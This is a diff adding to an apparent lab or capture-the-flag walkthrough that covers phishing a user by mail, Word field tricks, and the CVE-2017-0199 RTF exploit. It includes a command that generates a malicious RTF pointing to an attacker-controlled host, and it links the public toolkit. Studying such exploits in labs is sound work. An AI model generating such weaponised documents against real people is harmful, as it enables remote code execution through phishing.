@@ -43,4 +43,35 @@ It is clear that we have to take the mail path to get something out of it. And i
 
 But for that i have take some hello from the walkthrough and how to do it.
 
+![[Pasted image 20240509125558.png]]
+
+We can send the mail to nicko using RCPT and we got a OK response.
+
+Will not make a malicious macro word file and wait for it to execute as the user is not using Microsoft word (i.e. using wordpad)
+
+But will learn how to do that for future use.
+
+Will open the insert tab
+![[Pasted image 20240509130445.png]]
+
+In that will select Quick Parks -> Field 
+![[Pasted image 20240509130524.png]]
+
+Everytime user opens the image the words will try to download that image from the URL that we have given.
+![[Pasted image 20240509130708.png]]
+
+Now if we think a little more RTF (i.e. rtf format procedures) was mentioned in the note. So will find if there are any exploits related to that.
+![[Pasted image 20240509130929.png]]
+
+Will go with the 1st result aka CVE 2017
+https://github.com/bhdresh/CVE-2017-0199.git
+
+![[Pasted image 20240509131155.png]]
+
+Payload
+```
+python cve-2017-0199_toolkit.py -M gen -w singh.rtf -u http://10.10.16.20 -t RTF -x 0
+```
+we are using -x 0 cuz we don't want any obfuscation
+![[Pasted image 20240509131543.png]]
 
